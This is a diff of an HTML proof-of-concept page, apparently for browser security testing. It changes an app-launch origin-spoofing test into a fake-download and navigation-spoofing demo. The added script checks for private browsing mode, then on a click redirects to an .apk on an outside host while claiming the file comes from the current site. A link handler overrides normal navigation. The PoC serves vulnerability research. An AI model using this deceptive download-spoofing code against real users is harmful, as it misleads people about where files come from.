@@ -3,27 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC - Origin Spoofing / App Launch Spoofing</title>
+    <title>PoC - iOS Fake Download and Navigation Spoofing</title>
 </head>
 <body>
 
-    <h1>PoC - Cross-Origin Launching</h1>
-    <p>This test will try to simulate the behavior of misleading origin spoofing and app-launch dialogs.</p>
+    <h1>PoC - iOS Fake Download and Navigation Spoofing</h1>
+    <p>This test simulates a malicious behavior of downloading a fake file upon using the back button, deceiving the user.</p>
     
-    <button id="launchApp">Launch External App</button>
-
+    <button id="startDownload">Start Fake Download</button>
     <br><br>
-    <select id="appSelector">
-        <option value="tel:+1234567890">Phone (tel:)</option>
-        <option value="mailto:someone@example.com">Email (mailto:)</option>
-        <option value="sms:+1234567890">SMS (sms:)</option>
-        <option value="maps:37.7749,-122.4194">Maps (maps:)</option>
-        <option value="whatsapp://send?phone=+1234567890&text=Hello">WhatsApp</option>
-        <option value="skype:echo123?call">Skype</option>
-        <option value="instagram://user?username=yourusername">Instagram</option>
-        <option value="facebook://profile/1234567890">Facebook</option>
-    </select>
-
+    <a href="https://example.com" id="exampleLink">Visit example.com</a>
+    
     <script>
         // Detect if we are in Private Browsing Mode (Incognito)
         function isPrivateMode(callback) {
@@ -41,26 +31,33 @@
             });
         }
 
-        // Simulate opening an external URI to trigger app launch
-        function launchExternalApp(uri) {
-            window.location.href = uri;
+        // Simulate malicious file download
+        function initiateFakeDownload() {
+            // Simulate a fake download by redirecting to a file
+            const fakeFileUrl = "https://ecdnts-del.github.io/test-apk/apple.apk"; // Just a placeholder URL
+            window.location.href = fakeFileUrl;  // This would typically attempt to trigger the file download
+            alert("Fake download initiated! The file appears to be from the current site.");
         }
 
-        // Event listener for the button to trigger app launch
-        document.getElementById('launchApp').addEventListener('click', function() {
-            // Get the selected app URI from the dropdown
-            const appUri = document.getElementById('appSelector').value;
-            
-            // Check if we're in Private Browsing Mode
+        // Event listener to trigger the fake download when button is clicked
+        document.getElementById('startDownload').addEventListener('click', function() {
             isPrivateMode(function(isPrivate) {
                 if (isPrivate) {
-                    alert("You are in Private Browsing Mode. Launching the external URI might bypass normal security prompts.");
+                    alert("You are in Private Browsing Mode. This could bypass security prompts.");
                 }
-                // Now launch the external app (simulating origin spoofing)
-                launchExternalApp(appUri);
+                // Simulate a malicious file download
+                initiateFakeDownload();
             });
         });
+
+        // Event listener for the example link, simulating the redirection
+        document.getElementById('exampleLink').addEventListener('click', function(event) {
+            event.preventDefault();  // Prevents default link navigation
+            alert("Navigating to example.com, but back navigation will cause a fake download.");
+            // Simulating a user navigating away and clicking back later
+            window.location.href = "https://google.com";  // Redirect to simulate leaving the site
+        });
     </script>
-    
+
 </body>
 </html>
